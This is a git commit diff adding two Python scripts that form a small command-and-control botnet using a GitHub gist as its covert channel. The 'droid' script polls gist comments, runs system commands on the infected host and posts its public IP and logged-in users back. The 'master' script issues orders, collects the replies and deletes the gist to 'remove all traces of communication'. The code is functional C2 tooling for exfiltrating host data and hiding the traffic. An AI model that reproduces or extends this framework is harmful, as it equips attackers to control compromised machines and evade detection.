a5b5bd00df5cedc7e21f7de9676acf7e6cb04658
Mighantos <michalsvag@gmail.com>
2022-12-29 01:58:00 +0100

    Get users

--- droid.py
+++ droid.py
@@ -1,6 +1,9 @@
 import sys
 import requests
 import json
+import time
+from datetime import datetime
+import subprocess
 
 
 class Git:
@@ -20,6 +23,7 @@ class Git:
         res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
         if res.status_code != 201:
             print("Unable to create gist. Statu code " + str(res.status_code))
+            print(res.text)
             exit(2)
 
         self.gist_id = json.loads(res.text)['id']
@@ -32,6 +36,7 @@ class Git:
 
         if res.status_code != 200:
             print("Unable to get all gists. Statu code " + str(res.status_code))
+            print(res.text)
 
         last_updated = ""
         for gist in json.loads(res.text):
@@ -44,41 +49,86 @@ class Git:
             exit(2)
         print("Using gist with id: " + self.gist_id)
 
-    def update_gist(self, file_name, content):
+    def add_comment_to_gist(self, content):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
-        params = {'scope': 'gist'}
-        payload = {"description": "GIST updated by python code",
-                   "public": False,
-                   "files": {file_name: {"content": content}}}
-        url = self.GITHUB_GIST_API + "/" + self.gist_id
+        payload = {"body": content}
+        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"
 
-        res = requests.post(url, headers=headers, params=params, data=json.dumps(payload))
+        res = requests.post(url, headers=headers, data=json.dumps(payload))
+        if res.status_code != 201:
+            print("Unable to add comment to gist. Statu code " + str(res.status_code))
+            print(res.text)
 
-        print(res.status_code)
-        print(res.url)
-        print(res.text)
+    def get_gist_comments(self):
+        headers = {'Authorization': 'token %s' % self.API_TOKEN}
+        params = {'Accept': 'application/vnd.github+json'}
+        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"
 
-    def get_gist(self):
+        res = requests.get(url, headers=headers, params=params)
+        if res.status_code != 200:
+            print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
+            print(res.text)
+
+        return json.loads(res.text)
+
+    def remove_gist(self):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
         params = {'Accept': 'application/vnd.github+json'}
         url = self.GITHUB_GIST_API + "/" + self.gist_id
 
-        res = requests.get(url, headers=headers, params=params)
-        if res.status_code != 200:
-            print(res.status_code)
-            print(res.url)
+        res = requests.delete(url, headers=headers, params=params)
+        if res.status_code != 204:
+            print("Unable to remove gist " + self.gist_id + ". Statu code " + str(res.status_code))
+            print(res.text)
 
-        return json.loads(res.text)
+
+def get_ip():
+    return requests.get('https://api.ipify.org').content.decode('utf8')
+
+
+def execute_command(command):
+    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
+    return process.communicate()
+
+
+def get_users(git, message):
+    comment_message = "> " + message
+    comment_message += "\n\nDroid with number " + ip + " reporting usage by: \n\n"
+    bash_command = "w"
+    output, error = execute_command(bash_command)
+    lines = output.splitlines()
+    for i in range(2, len(lines)):
+        line = lines[i]
+        comment_message += "- " + str(line.split()[0].decode("utf-8")) + "\n"
+
+    git.add_comment_to_gist(comment_message)
 
 
 if __name__ == '__main__':
-    if (len(sys.argv) != 3):
+    if len(sys.argv) != 3:
         print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
         exit(1)
 
     github_gist_api = "https://api.github.com/gists"
     api_token = sys.argv[1]
     gist_name = sys.argv[2]
-    git = Git(github_gist_api, api_token)
+    git_instance = Git(github_gist_api, api_token)
+    git_instance.get_and_set_gist_id(gist_name)
+    last_comment_check = datetime.utcnow()
+    ip = get_ip()
+    date_format = "%Y-%m-%dT%H:%M:%SZ"
 
-    git.get_and_set_gist_id(gist_name)
+    while True:
+        new_comments = []
+        for comment in git_instance.get_gist_comments():
+            if datetime.strptime(comment['updated_at'], date_format) > last_comment_check \
+                    and comment['body'].startswith("# Question\n"):
+                new_comments.append(comment)
+        for comment in new_comments:
+            date_time = datetime.strptime(comment['updated_at'], date_format)
+            if date_time > last_comment_check:
+                last_comment_check = date_time
+            body = comment['body'].replace('# Question\n', '')
+            if body.startswith("Droids, who uses you right now?"):
+                get_users(git_instance, body)
+        time.sleep(5)
--- master-control-signal.py
+++ master-control-signal.py
@@ -1,6 +1,8 @@
 import sys
 import requests
 import json
+import time
+from datetime import datetime
 
 
 class Git:
@@ -20,6 +22,7 @@ class Git:
         res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
         if res.status_code != 201:
             print("Unable to create gist. Statu code " + str(res.status_code))
+            print(res.text)
             exit(2)
 
         self.gist_id = json.loads(res.text)['id']
@@ -32,6 +35,7 @@ class Git:
 
         if res.status_code != 200:
             print("Unable to get all gists. Statu code " + str(res.status_code))
+            print(res.text)
 
         last_updated = ""
         for gist in json.loads(res.text):
@@ -44,33 +48,96 @@ class Git:
             exit(2)
         print("Using gist with id: " + self.gist_id)
 
-    def update_gist(self, file_name, content):
+    def add_comment_to_gist(self, content):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
-        params = {'scope': 'gist'}
-        payload = {"description": "GIST updated by python code",
-                   "public": False,
-                   "files": {file_name: {"content": content}}}
+        payload = {"body": content}
+        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"
+
+        res = requests.post(url, headers=headers, data=json.dumps(payload))
+        if res.status_code != 201:
+            print("Unable to add comment to gist. Statu code " + str(res.status_code))
+            print(res.text)
+
+    def get_gist_comments(self):
+        headers = {'Authorization': 'token %s' % self.API_TOKEN}
+        params = {'Accept': 'application/vnd.github+json'}
+        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"
+
+        res = requests.get(url, headers=headers, params=params)
+        if res.status_code != 200:
+            print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
+            print(res.text)
+
+        return json.loads(res.text)
+
+    def remove_gist(self):
+        headers = {'Authorization': 'token %s' % self.API_TOKEN}
+        params = {'Accept': 'application/vnd.github+json'}
         url = self.GITHUB_GIST_API + "/" + self.gist_id
 
-        res = requests.post(url, headers=headers, params=params, data=json.dumps(payload))
+        res = requests.delete(url, headers=headers, params=params)
+        if res.status_code != 204:
+            print("Unable to remove gist " + self.gist_id + ". Statu code " + str(res.status_code))
+            print(res.text)
 
-        print(res.status_code)
-        print(res.url)
-        print(res.text)
+
+def wait_for_reasonable_time():
+    time.sleep(10)
+
+
+def request_logged_in_users(git):
+    comment_text = "# Question\nDroids, who uses you right now?"
+    git.add_comment_to_gist(comment_text)
+    print("Gathering information...")
+    wait_for_reasonable_time()
+    related_comments = []
+    for comment in git.get_gist_comments():
+        if datetime.strptime(comment['updated_at'], date_format) >= last_comment_check \
+                and comment['body'].startswith("> Droids, who uses you right now?"):
+            related_comments.append(comment['body'])
+
+    for comment in related_comments:
+        lines = comment.splitlines()
+        print("Bot on ip "+str(lines[2].split()[3])+" is used by:")
+        for i in range(4, len(lines)):
+            print(lines[i])
 
 
 if __name__ == '__main__':
-    if (len(sys.argv) != 3):
+    if len(sys.argv) != 3:
         print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
         exit(1)
 
     github_gist_api = "https://api.github.com/gists"
     api_token = sys.argv[1]
     gist_name = sys.argv[2]
-    git = Git(github_gist_api, api_token)
+    git_instance = Git(github_gist_api, api_token)
+    date_format = "%Y-%m-%dT%H:%M:%SZ"
 
-    # gistId = git.create_gist(gist_name)
-    git.get_and_set_gist_id(gist_name)
+    git_instance.create_gist(gist_name)
 
-    content = "content\ntext\ntest"
-    git.update_gist("new", content)
+    run = True
+    art = "     ____________________________\n    !\_________________________/!\\\n    !!                         !! \\\n    !!  What a lovely day      !!  \\\n    !!  to use our loyal       !!  !\n    !!  droids, my lord.       !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  /\n    !!_________________________!! /\n    !/_________________________\!/\n       __\_________________/__/!\n      !_______________________!/\n    ________________________\n   /oooo  oooo  oooo  oooo /!\n  /ooooooooooooooooooooooo/ /\n /ooooooooooooooooooooooo/ /\n/C=_____________________/_/\n"
+    question = "\nWhat do you want me to order the droids, my lord?\n"
+    options = "1 - Get users logged in to the droids\n" \
+              "6 - Quit and remove all traces of communication\n"
+    wrong_option_text = "I am so sorry to disagree with your order, my lord. " \
+                        "But your answer must be a number from 1 to 6."
+    print(art)
+    while run:
+        try:
+            selected_option = int(input(question + options))
+        except:
+            print(wrong_option_text)
+            continue
+        last_comment_check = datetime.utcnow()
+        if selected_option == 1:
+            print("Excellent choice, my lord.")
+            request_logged_in_users(git_instance)
+        elif selected_option == 6:
+            run = False
+        else:
+            print(wrong_option_text)
+            continue
+        question = "\nWhat do you want me to order the droids next, my lord?\n"
+    git_instance.remove_gist()
